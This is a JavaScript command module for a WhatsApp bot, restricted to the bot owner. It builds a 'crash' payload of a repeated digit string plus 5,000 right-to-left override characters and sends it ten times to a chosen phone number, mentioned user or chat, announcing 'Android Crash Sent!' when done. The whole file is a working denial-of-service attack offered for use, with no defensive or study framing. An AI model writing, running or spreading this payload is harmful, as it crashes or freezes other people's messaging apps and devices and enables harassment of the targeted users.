module.exports = async function(sock, from, msg, isOwner, q) {
    if (!isOwner) return await sock.sendMessage(from, { text: '❌ Owner only!' }, { quoted: msg });
    
    try {
        let target;
        const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        const quoted = msg.message?.extendedTextMessage?.contextInfo?.participant;
        
        if (q) target = q.replace(/\D/g, '') + '@s.whatsapp.net';
        else if (mentioned) target = mentioned;
        else if (quoted) target = quoted;
        else target = from;

        await sock.sendMessage(from, { text: `🤖 *Sending Android Specific Crash to:* ${target.split('@')[0]}` }, { quoted: msg });

        // Android lag/crash often uses large character blocks and RTL characters
        const androPayload = "0.7.0.7.0.7.0.7".repeat(2000) + "\u202E".repeat(5000);

        for (let i = 0; i < 10; i++) {
            try {
                await sock.sendMessage(target, { text: androPayload });
            } catch (e) {}
        }

        await sock.sendMessage(from, { text: '✅ *Android Crash Sent!*' }, { quoted: msg });
    } catch (e) {
        await sock.sendMessage(from, { text: '❌ Error: ' + e.message }, { quoted: msg });
    }
};
